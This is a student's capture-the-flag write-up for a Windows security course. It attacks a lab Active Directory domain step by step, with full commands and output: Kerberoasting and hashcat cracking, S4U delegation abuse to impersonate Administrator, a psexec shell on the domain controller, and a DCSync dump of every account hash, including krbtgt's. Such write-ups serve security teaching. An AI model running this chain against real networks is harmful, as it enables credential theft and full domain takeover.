# Windows Security II

Student: Ernst Schwaiger

## Setting up VPN

Using 
- the provided password for the account `its26eschwaig`, 
- the vpn configuration file obtained at the SOPHOS portal and 
- the Kali `openvpn` client,

a vpn connection is set up as follows:

```zsh
sudo openvpn --config sslvpn-its26eschwaig-client-config.ovpn
```

## Support

I thank my fellow Students Kamil Mankowski and Lorenzo Haidinger for their helpful input.


## KRBRST

>There are service accounts with weak passwords configured in the active directory. We head of weak passwords (10 
>chars long, ends with 123A!, mostly lower case). The target is the portal server account with Service Principal 
>Name “HTTP/test”. The flag is the password of this user.
>
>Hints Windows:
>
>    setspn.exe
>    Invoke-Kerberoast
>    mimikatz
>    kerberos::ask
>
>Hints Linux:
>
>    GetUserSPNs.py
>    hashcat

As the invocation of `GetUserSPNs.py` fails when only providing the `winctf` subdomain name, `ldapsearch` provides its full distinguished name (DN):

```bash
ldapsearch -x -H ldap://192.168.10.162 -b "" -s base | grep "rootDomainNamingContext"
rootDomainNamingContext: DC=winctf,DC=its,DC=local
```

The DN of `winctf` is hence `winctf.its.local`. Using that information, `GetUserSPNs.py` can be invoked:

```bash
GetUserSPNs.py -outputfile kerberoastables.txt -hashes :2785d316dd37ca24ebb855fcf054c74a -dc-ip 192.168.10.162 -request winctf.its.local/monitoring
cat kerberoastables.txt
$krb5tgs$23$*svc.portal$WINCTF.ITS.LOCAL$winctf.its.local/svc.portal*$1c740f6a62922d888f4aa65b73facbbd$b22...60e
```

The obtained ticket is a TGS ticket with the hash of the service user `svc.portal`, of the domain `winctf.its.local`. The resulting ticket can now be brute forced via `hashcat`. As the length of the password and its suffix are known, and it is also known that all unknown characters in the password are lower-case characters, the hashcat pattern `?l?l?l?l?l123A!` is applied on the hash mode `13100`, for Kerberos 5 TGS tickets.

```
hashcat -m 13100 -a 3 kerberoastables.txt ?l?l?l?l?l123A!
```

Which after a few seconds yields the password:

```
$krb5tgs$23$*svc.portal$WINCTF.ITS.LOCAL$winctf.its.local/svc.portal*$1c740f6a62922d888f4aa65b73facbbd$b22...60e:qsdgx123A!
```

The password is `qsdgx123A!`.


## S4U

>There is an insecure delegation enabled in the domain: the portal (HTTP) can access file shares (CIFS) as 
>arbitrary user. Check if there is a delegation to SPN “CIFS/<domain controller>”. This flag is at C:\flag.txt on 
>the Domain Controller itself.
>
>Hints Windows:
>
>    Rubeus.exe
>
>Hints Linux:
>
>    getSt.py
>    psexec -debug
>    export KRB5CCNAME=user123123.ccache

In order to get a list of the services that allow delegation, `ldapsearch` can be used together with the freshly obtained password:

```bash
ldapsearch -x \
  -H ldap://192.168.10.162 \
  -D "svc.portal@winctf.its.local" \
  -w 'qsdgx123A!' \
  -b "dc=winctf,dc=its,dc=local" \
  "(servicePrincipalName=*)" \
  servicePrincipalName msDS-AllowedToDelegateTo userAccountControl

# extended LDIF
#
# LDAPv3
# base <dc=winctf,dc=its,dc=local> with scope subtree
# filter: (servicePrincipalName=*)
# requesting: servicePrincipalName msDS-AllowedToDelegateTo userAccountControl 
#

# svc.portal, ServiceAccounts, User, company, winctf.its.local
dn: CN=svc.portal,OU=ServiceAccounts,OU=User,OU=company,DC=winctf,DC=its,DC=lo
 cal
userAccountControl: 16843264
servicePrincipalName: HTTP/test
servicePrincipalName: CIFS/winctf
servicePrincipalName: CIFS/its24dc05
msDS-AllowedToDelegateTo: cifs/WIN-OJQUBDK1D3U.winctf.its.local/winctf.its.loc
 al
msDS-AllowedToDelegateTo: cifs/WIN-OJQUBDK1D3U.winctf.its.local
msDS-AllowedToDelegateTo: cifs/WIN-OJQUBDK1D3U
msDS-AllowedToDelegateTo: cifs/WIN-OJQUBDK1D3U.winctf.its.local/winctf
msDS-AllowedToDelegateTo: cifs/WIN-OJQUBDK1D3U/winctf
...
# search result
search: 2
result: 0 Success

# numResponses: 7
# numEntries: 3
# numReferences: 3
```

`userAccountControl` is a bitmap conveying what the service account `svc.portal` is allowed to do. The value `16843264` includes the `TRUSTED_TO_AUTH_FOR_DELEGATION/0x1000000` flag, which allows services running on this account to assume a client's identity and authenticate as that user to other servers on the network, i.e. delegation.
https://learn.microsoft.com/en-gb/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties

The `servicePrincipalName` shows all the SPNs/services that are executing using the `svc.portal` account, for instance `HTTP/test`.

The `msDS-AllowedToDelegateTo` list indicates the SPNs `svc.portal` can delegate to, for instance `cifs/WIN-OJQUBDK1D3U`. This means that the services executing under the service account `svc.portal` may request TGSs on behalf of client users for all of the SPNs listed above. 

For obtaining user groups and their members in the domain, `ldapsearch` can be invoked like this

```bash
ldapsearch -x -H ldap://192.168.10.162 \
  -D "svc.portal@winctf.its.local" -w 'qsdgx123A!' \
  -b "DC=winctf,DC=its,DC=local" \
  "(objectClass=group)" \
  cn member

# extended LDIF
#
# LDAPv3
# base <DC=winctf,DC=its,DC=local> with scope subtree
# filter: (objectClass=group)
# requesting: cn member 
#

# Administrators, Builtin, winctf.its.local
dn: CN=Administrators,CN=Builtin,DC=winctf,DC=its,DC=local
cn: Administrators
member: CN=Domain Admins,CN=Users,DC=winctf,DC=its,DC=local
member: CN=Enterprise Admins,CN=Users,DC=winctf,DC=its,DC=local
member: CN=Administrator,CN=Users,DC=winctf,DC=its,DC=local
...

# search result
search: 2
result: 0 Success

# numResponses: 52
# numEntries: 48
# numReferences: 3
```

The user `Administrator` belongs to the builtin `Administrators` group, it is likely that it may access the CIFS service.

Now a service ticket for `cifs/WIN-OJQUBDK1D3U` can be obtained via `getSt.py`, which will request a service ticket for `svc.portal`, then replace the client entry by the `Administrator` account.

```bash
getST.py -impersonate Administrator -spn cifs/WIN-OJQUBDK1D3U -dc-ip 192.168.10.162 winctf.its.local/svc.portal:qsdgx123A!
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
...
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
...
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WIN-OJQUBDK1D3U@WINCTF.ITS.LOCAL.ccache
```

`nslookup` obtains the IP address of the WIN-OJQUBDK1D3U in the domain:

```bash
nslookup WIN-OJQUBDK1D3U.winctf.its.local 192.168.10.162
Server:         192.168.10.162
Address:        192.168.10.162#53

Name:   WIN-OJQUBDK1D3U.winctf.its.local
Address: 192.168.10.162
Name:   WIN-OJQUBDK1D3U.winctf.its.local
Address: 2a02:60:4:3305:a2db:59ca:4ceb:b4f8
```

This indcates that the CIFS service also executes on the domain controller, `192.168.10.162`. For accessing it, `psexec.py` and the previously obtained ticket can be used as follows to obtain the requested flag:

```
export KRB5CCNAME=Administrator@cifs_WIN-OJQUBDK1D3U@WINCTF.ITS.LOCAL.ccache
psexec.py -k -no-pass -target-ip 192.168.10.162 -dc-ip 192.168.10.162 winctf.its.local/Administrator@WIN-OJQUBDK1D3U
...
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.10.162.....
[*] Found writable share ADMIN$
[*] Uploading file bnleMPTN.exe
[*] Opening SVCManager on 192.168.10.162.....
[*] Creating service KXje on 192.168.10.162.....
[*] Starting service KXje.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1850]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> type c:\flag.txt
765081686422632A9D6B6456B1F8A4BF
```


## SYNC

>The ultimate goal is the krbtgt password hash. This would enable us to create Golden Tickets.
>
>Hints Windows:
>
>    mimikatz dcsync
>
>Hints Linux:
>
>    export KRB5CCNAME=
>    secretsdump.py -just-dc

Secrets can be retrieved remotely by using `secretsdump` and the service ticket obtained in the previous step:

```bash
export KRB5CCNAME=Administrator@cifs_WIN-OJQUBDK1D3U@WINCTF.ITS.LOCAL.ccache
secretsdump.py -just-dc -k -no-pass -target-ip 192.168.10.162 -dc-ip 192.168.10.162 'winctf.its.local/Administrator@WIN-OJQUBDK1D3U'
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b99465e6fe18bb851d490fa5da46f832:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2cb5f3cc8de109a4bdb0a22fb372bb87:::
winctf.its.local\student:1103:aad3b435b51404eeaad3b435b51404ee:d4744cb4de9c21480907c08ff05c2604:::
winctf.its.local\svc.backup:1104:aad3b435b51404eeaad3b435b51404ee:834ff016f859163616b40cd5d257d8da:::
winctf.its.local\monitoring:1105:aad3b435b51404eeaad3b435b51404ee:2785d316dd37ca24ebb855fcf054c74a:::
winctf.its.local\portal:1106:aad3b435b51404eeaad3b435b51404ee:bb58204a3613383c0d3e718f2e7c27aa:::
winctf.its.local\svc.portal:1107:aad3b435b51404eeaad3b435b51404ee:834ff016f859163616b40cd5d257d8da:::
WIN-OJQUBDK1D3U$:1000:aad3b435b51404eeaad3b435b51404ee:35f5b4d40ab325602832b0dbd48421a8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:aebacc5a8e8a24b3c79543524c3c05459e1bf02468f921927766c44909e90d60
Administrator:aes128-cts-hmac-sha1-96:75cca647cd9160d1a34c436a42e64887
Administrator:des-cbc-md5:973e89296880d083
krbtgt:aes256-cts-hmac-sha1-96:3aa80c2f8a1ccb0818d5e328f7801f5e6abf36eb9fb9342fca0d708bbfdb49a5
krbtgt:aes128-cts-hmac-sha1-96:7d1133b9bfe8cbc0fdd1fc056511c794
krbtgt:des-cbc-md5:08df103ef8010b7a
winctf.its.local\student:aes256-cts-hmac-sha1-96:75dc25e6a626b55655fdd065d7b7a5c8043c3513a36eab3460eebb560f09f93f
winctf.its.local\student:aes128-cts-hmac-sha1-96:6de021702f365e16362ecf4c14f24293
winctf.its.local\student:des-cbc-md5:f40219c89b0dd046
winctf.its.local\svc.backup:aes256-cts-hmac-sha1-96:6dbb3e606cee705abdc52511db99c50205d7482ec67874ae35e2caf7241be297
winctf.its.local\svc.backup:aes128-cts-hmac-sha1-96:249be357fe50ada76127a9ccd5d4cb23
winctf.its.local\svc.backup:des-cbc-md5:495b6e04ba202fec
winctf.its.local\monitoring:aes256-cts-hmac-sha1-96:1bae14f9e61aa523ccecff25be66fd06f77aa9f9aaa9d18e4047686005c01ec4
winctf.its.local\monitoring:aes128-cts-hmac-sha1-96:c34d4b24e16afbfc20cb2b2a969d64b8
winctf.its.local\monitoring:des-cbc-md5:5e202ca13ba1df70
winctf.its.local\portal:aes256-cts-hmac-sha1-96:d8c8f9ac9d1352c34822611fec159b4b9406324439cb69b6be1d377224c7d87c
winctf.its.local\portal:aes128-cts-hmac-sha1-96:1e50480a7688ac1cdd844bbcfa812d5e
winctf.its.local\portal:des-cbc-md5:522f76f19d75257f
winctf.its.local\svc.portal:aes256-cts-hmac-sha1-96:bccc344e19d66d3a4dee1532eb2a008d905c97452f93021336bf93e863becab2
winctf.its.local\svc.portal:aes128-cts-hmac-sha1-96:1e60438b1075d6b7742b1e55bc983030
winctf.its.local\svc.portal:des-cbc-md5:79686775e9d0c802
WIN-OJQUBDK1D3U$:aes256-cts-hmac-sha1-96:61717156783719061c242bb30ae7a311daba518ae85589ce387cee50f10056e0
WIN-OJQUBDK1D3U$:aes128-cts-hmac-sha1-96:909333b383987f00598234398bccd464
WIN-OJQUBDK1D3U$:des-cbc-md5:e091c4010ef7894a
[*] Cleaning up...
```

The NTLM and Kerberos hash entries for `krbtgt` can be subsequently used to create Golden Tickets:

```bash
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2cb5f3cc8de109a4bdb0a22fb372bb87:::
krbtgt:aes256-cts-hmac-sha1-96:3aa80c2f8a1ccb0818d5e328f7801f5e6abf36eb9fb9342fca0d708bbfdb49a5
krbtgt:aes128-cts-hmac-sha1-96:7d1133b9bfe8cbc0fdd1fc056511c794
krbtgt:des-cbc-md5:08df103ef8010b7a
```
